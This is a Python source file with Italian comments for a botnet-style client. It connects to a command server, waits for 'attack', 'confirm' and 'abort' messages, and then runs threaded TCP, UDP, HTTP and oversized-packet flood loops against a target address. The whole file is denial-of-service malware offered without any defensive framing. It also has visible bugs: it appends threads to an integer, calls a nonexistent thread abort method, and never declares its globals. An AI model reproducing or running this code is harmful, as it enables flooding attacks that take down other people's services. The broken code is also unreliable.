import threading
import requests
import socket

# Dati target
TYPE, IP, PORT, THREADS, METHOD = "", "", 0, 0, ""

THREADS_LIST = []

class Attack:
    
    def init():
        if METHOD == "TCP_FLOOD":
            threads = int(THREADS)
            for i in range(threads):
                thread = threading.Thread(target=tcp_flood) # type: ignore
                THREADS.append(thread)

    def abort():
        for thread in THREADS:
            thread.abort()
    def confirm():
        for thread in THREADS:
            thread.run()
    
    def tcp_flood():
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((IP, PORT))
            s.send(b"GET / HTTP/1.1\r\nHost: %^&((*&)%$^%$^$%&*()F^T^&T%R&^T*FIG%&TF^UGYYGH56438794536879\r\n\r\n")
            s.close()
    def udp_flood():
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(b"A" * 1024, (IP, PORT))
    def http_flood():
        while True:
            requests.get(f"{IP}:{PORT}")
    def bigPacket():
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(b"A" * 65535, (IP, PORT))
    

# Funzione per gestire i messaggi dal server
def receive_messages_from_server(client_socket):
    while True:
        # Ricevi dati dal server
        message = client_socket.recv(1024).decode('utf-8')

        # Se il messaggio è vuoto, il server si è disconnesso
        if message == "terminate":
            print("Il server si è disconnesso.")
            break
        
        TYPE = message.split(" ")[0]
        
        if TYPE == "attack":
            
            TYPE, IP, PORT, THREADS, METHOD = message.split(" ")
            Attack.init()
        elif TYPE == "confirm":
            print("Confermare l'attacco")
            Attack.confirm()
        elif TYPE ==  "abort":
            print("Terminating attack.")
            Attack.abort()
        else:
            pass

# Funzione principale del client
def start_client(host, port):
    # Connessione al server
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host, port))

    # Avvia un thread per ricevere messaggi dal server
    receive_thread = threading.Thread(target=receive_messages_from_server, args=(client,))
    receive_thread.start()

    # Attendi che il thread di ricezione termini
    receive_thread.join()

    # Chiudi la connessione
    client.close()

# Avvia il client
if __name__ == "__main__":
    start_client('10.0.0.100', 20000)
